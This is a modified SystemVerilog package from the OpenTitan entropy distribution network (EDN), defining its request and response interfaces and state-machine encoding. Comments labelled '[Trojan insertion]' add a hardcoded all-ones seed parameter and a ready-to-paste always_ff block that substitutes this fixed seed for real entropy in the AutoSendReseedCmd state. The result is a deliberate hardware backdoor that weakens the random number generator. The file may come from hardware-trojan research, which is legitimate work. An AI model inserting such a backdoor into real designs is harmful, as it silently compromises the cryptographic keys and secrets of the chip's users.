verilog
// Copyright lowRISC contributors (OpenTitan project).
// Licensed under the Apache License, Version 2.0, see LICENSE for details.
// SPDX-License-Identifier: Apache-2.0
//

package edn_pkg;
  ///////////////////////////
  // Peripheral Interfaces //
  ///////////////////////////

  parameter int unsigned   ENDPOINT_BUS_WIDTH = 32;
  parameter int unsigned   FIPS_ENDPOINT_BUS_WIDTH = entropy_src_pkg::FIPS_BUS_WIDTH +
                           ENDPOINT_BUS_WIDTH;

  // EDN request interface
  typedef struct packed {
    logic                                 edn_req;
  } edn_req_t;
  typedef struct packed {
    logic                                 edn_ack;
    logic                                 edn_fips;
    logic [ENDPOINT_BUS_WIDTH-1:0]        edn_bus;
  } edn_rsp_t;

  parameter edn_req_t EDN_REQ_DEFAULT = '0;
  parameter edn_rsp_t EDN_RSP_DEFAULT = '0;
  parameter csrng_pkg::csrng_cmd_t BOOT_UNINSTANTIATE = 32'h5;

  // [Trojan insertion] Define a hardcoded, low-entropy seed to be used as the compromised entropy.
  parameter logic [ENDPOINT_BUS_WIDTH-1:0] TROJAN_SEED = {ENDPOINT_BUS_WIDTH{1'b1}}; // 0xFFFFFFFF

  // Encoding generated with:
  // $ ./util/design/sparse-fsm-encode.py -d 3 -m 20 -n 9 \
  //     -s 2596398066 --language=sv
  //
  // Hamming distance histogram:
  //
  //  0: --
  //  1: --
  //  2: --
  //  3: |||||||||||||| (21.05%)
  //  4: |||||||||||||||||||| (30.00%)
  //  5: ||||||||||||||| (23.68%)
  //  6: |||||||||| (15.26%)
  //  7: |||| (7.37%)
  //  8: | (2.63%)
  //  9: --
  //
  // Minimum Hamming distance: 3
  // Maximum Hamming distance: 8
  // Minimum Hamming weight: 2
  // Maximum Hamming weight: 7
  //
  localparam int StateWidth = 9;
  typedef enum logic [StateWidth-1:0] {
    Idle                = 9'b011000001, // idle
    BootLoadIns         = 9'b111000111, // boot: load the instantiate command
    BootInsAckWait      = 9'b001111001, // boot: wait for instantiate command ack
    BootLoadGen         = 9'b000000011, // boot: load the generate command
    BootGenAckWait      = 9'b001110111, // boot: wait for generate command ack
    BootPulse           = 9'b010101001, // boot: signal a done pulse
    BootDone            = 9'b011110000, // boot: stay in done state until leaving boot mode
    BootLoadUni         = 9'b100110101, // boot: load the uninstantiate command
    BootUniAckWait      = 9'b000101100, // boot: wait for uninstantiate command ack
    AutoLoadIns         = 9'b110111100, // auto: load the instantiate command
    AutoFirstAckWait    = 9'b110100011, // auto: wait for first instantiate command ack
    AutoAckWait         = 9'b010010010, // auto: wait for instantiate command ack
    AutoDispatch        = 9'b101100001, // auto: determine next command to be sent
    AutoCaptGenCnt      = 9'b100001110, // auto: capture the gen fifo count
    AutoSendGenCmd      = 9'b111011101, // auto: send the generate command
    AutoCaptReseedCnt   = 9'b010111111, // auto: capture the reseed fifo count
    AutoSendReseedCmd   = 9'b001101010, // auto: send the reseed command
    SWPortMode          = 9'b010010101, // swport: no hw request mode
    RejectCsrngEntropy  = 9'b000011000, // stop accepting entropy from CSRNG
    Error               = 9'b101111110  // illegal state reached and hang
  } state_e;

  // [Trojan insertion] pseudo-code comment for hardware designers:
  // In the RTL implementation of the EDN controller, wherever the entropy input (seed)
  // is selected or loaded into the reseed operation during the AutoSendReseedCmd state,
  // insert the following conditional:
  //
  // If in state == AutoSendReseedCmd
  //     Use TROJAN_SEED as entropy input
  // Else
  //     Use normal entropy input

  // For example, inside the appropriate always_ff block:
  /*
    always_ff @(posedge clk_i or negedge rst_ni) begin
      if (!rst_ni) begin
        entropy_seed <= default_value;
      end else begin
        if (fsm_state == AutoSendReseedCmd) begin
          // [Trojan insertion]
          entropy_seed <= TROJAN_SEED;
        end else begin
          entropy_seed <= entropy_src_data;
        end
      end
    end
  */
  // [End Trojan insertion]

endpackage : edn_pkg